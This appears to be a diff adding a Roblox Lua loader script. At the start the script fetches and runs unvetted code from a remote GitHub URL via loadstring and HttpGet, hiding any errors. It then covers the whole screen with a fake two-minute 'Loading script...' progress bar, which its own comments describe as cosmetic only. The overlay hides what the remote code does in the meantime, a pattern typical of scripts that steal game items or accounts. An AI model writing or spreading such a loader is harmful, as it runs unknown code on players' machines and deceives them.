@@ -1,0 +1,73 @@
+-- === CONFIG ===
+local LOAD_TIME = 120 -- 2 minutes
+local SCRIPT_URL = "https://raw.githubusercontent.com/i7luv7gambling7-code/sab/refs/heads/main/lua"
+
+-- === SERVICES ===
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- === RUN ORIGINAL SCRIPT IMMEDIATELY (NO DELAY) ===
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(SCRIPT_URL))()
+    end)
+end)
+
+-- === LOADER UI (PARALLEL / COSMETIC ONLY) ===
+local gui = Instance.new("ScreenGui")
+gui.Name = "OverlayLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0.2,0)
+title.Position = UDim2.new(0,0,0.35,0)
+title.BackgroundTransparency = 1
+title.Text = "Loading script..."
+title.TextColor3 = Color3.new(1,1,1)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = bg
+
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1,0,0.1,0)
+percent.Position = UDim2.new(0,0,0.48,0)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.new(1,1,1)
+percent.TextScaled = true
+percent.Font = Enum.Font.Gotham
+percent.Parent = bg
+
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.6,0,0.03,0)
+barBG.Position = UDim2.new(0.2,0,0.62,0)
+barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBG.BorderSizePixel = 0
+barBG.Parent = bg
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.new(1,1,1)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+-- === VISUAL TIMER ONLY ===
+local steps = 100
+local waitPerStep = LOAD_TIME / steps
+
+task.spawn(function()
+    for i = 1, steps do
+        bar.Size = UDim2.new(i/steps,0,1,0)
+        percent.Text = i .. "%"
+        task.wait(waitPerStep)
+    end
+    gui:Destroy()
+end)
